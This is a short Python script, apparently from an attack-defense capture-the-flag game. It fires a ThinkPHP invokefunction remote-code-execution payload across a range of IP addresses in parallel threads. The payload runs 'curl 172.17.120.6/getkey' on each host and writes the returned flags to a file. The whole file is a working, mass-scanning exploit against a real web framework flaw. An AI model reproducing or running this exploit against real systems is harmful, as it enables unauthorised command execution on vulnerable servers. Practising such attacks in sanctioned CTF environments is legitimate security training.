import requests
import threading

flags = []


def run(target):
    session = requests.Session()

    paramsGet = {'s': 'index/think\\app/invokefunction', 'vars[0]': 'system', 'function': 'call_user_func_array',
                 'vars[1][]': 'curl 172.17.120.6/getkey'}

    try:
        response = session.get(f'http://{target}/index.php', params=paramsGet)
        flags.append(response.text[0:37])
    except Exception as e:
        pass


if __name__ == '__main__':
    targets = []
    ip = '4.4.%s.100'
    for i in range(1, 255):
        targets.append(ip % i)

    for target in targets:
        t = threading.Thread(target=run, args=(target,))
        t.start()

    with open('../CTF/key.txt', 'a+') as f:
        for key in flags:
            f.write(key + '\n')
            print(key)
